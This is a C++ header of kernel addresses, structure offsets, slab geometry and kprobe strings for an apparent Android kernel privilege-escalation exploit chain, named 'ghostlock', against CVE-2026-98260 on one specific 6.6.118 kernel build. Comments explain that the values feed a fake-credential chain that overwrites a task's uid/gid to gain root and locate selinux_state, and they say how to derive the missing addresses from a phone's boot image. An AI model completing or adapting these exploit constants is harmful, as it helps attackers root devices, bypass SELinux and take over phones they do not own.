/* CVE-2026-98260 constants for:
 *   6.6.118-android15-8-gb9cc6ec16bc8-abogki536571621-4k
 *
 * Origin of the numbers (no value here is guessed):
 *
 *   - `selinux_state` / `arm64_sys_getpid` link addresses, sizeof(k_itimer),
 *     the cpu-timer node offset, the cred offset and the timer-node geometry
 *     come from quyicheng03-boop/CVE-2026-98260-dada-android, whose target
 *     kernel is this exact `uname -r` string:
 *       docs/ADAPTATION.md  (BTF offsets, image hashes, kallsyms addresses)
 *       src/exploit-dada-98260.c:59-80  (#define block)
 *   - `off_task_cred = 0x820` is independently corroborated by this project's
 *     own 6.6.118 profiles (`task_struct.cred = 2080`), which are derived from
 *     target BTF by tools/extract_rs.
 *   - The kprobe format strings are the ones that repository states it ran on
 *     this build (exploit-dada-98260.c:2879, :1153, :407, :436).
 *
 * Not derived here (zero => the consuming chain reports "unavailable"):
 *   panic_on_warn / root_user / init_user_ns / init_ucounts / init_groups.
 *   The fake-cred chain needs all five; this header cannot supply them without
 *   the target boot image, so it declares them absent instead of inventing
 *   addresses. Re-derive them with tools/extract_rs (or the timer-extract
 *   helper) from the phone's own boot.img and fill them in.
 *
 * Verification status: compiled but NOT validated on a device from this tree.
 * The runtime gates in cve_2026_98260_backend.cpp refuse to fire unless the
 * live geometry checks (/proc/slabinfo, page size, KASLR alignment) pass. */

#ifndef GHOSTLOCK_KBUILD_6_6_118_ANDROID15_8_GB9CC6EC16BC8_ABOGKI536571621_4K_H
#define GHOSTLOCK_KBUILD_6_6_118_ANDROID15_8_GB9CC6EC16BC8_ABOGKI536571621_4K_H

namespace ghostlock::timer {
    inline constexpr kbuild kbuild_6_6_118_android15_8_gb9cc6ec16bc8_abogki536571621_4k{
            .release = "6.6.118-android15-8-gb9cc6ec16bc8-abogki536571621-4k",
            .selinux_state = 0xffffffc08237a378ULL,
            .arm64_sys_getpid = 0xffffffc0800cda70ULL,
            .panic_on_warn = 0ULL,
            .root_user = 0ULL,
            .init_user_ns = 0ULL,
            .init_ucounts = 0ULL,
            .init_groups = 0ULL,
            .off_task_cred = 0x820ULL,
            .k_itimer_node_off = 0x78ULL,
            .k_itimer_rcu_off = 0xf8ULL,
            /* The do_timer_create hand-off probe already yields the k_itimer, so
             * no hrtimer subtraction applies on this build. */
            .k_itimer_hrtimer_off = 0ULL,
            .timer_alloc = 0x108ULL,
            .slab_bytes = 0x2000ULL,
            .slab_objects = 31ULL,
            .do_timer_create_x19_off = 0xc0ULL,
            .cred_uid_off = 8U,
            /* Not derived: the reference port only clears cred+8 (uid/gid).
             * The stock arm64 6.6 layout puts securebits at +0x28, but this tree
             * does not assume it - run tools/extract_rs --format kbuild against
             * this phone's boot.img to fill it in. */
            .cred_securebits_off = 0U,
            .probe_getpid =
                    "p:glk98260_getpid __arm64_sys_getpid ip=%pc:x64 "
                    "state=@selinux_state:x64 "
                    "lockword=@avc_latest_notif_update.notif_lock:x64",
            .probe_cred = "p:glk98260_cred __arm64_sys_getpid cred=+0x820(%x0):x64",
            .probe_timer = "p:glk98260_timer do_timer_create+0xc0 timer=%x19:x64",
            .probe_free_slab = "p:glk98260_free_slab __free_slab cache=%x0 slab=%x1",
    };
} // namespace ghostlock::timer

#endif
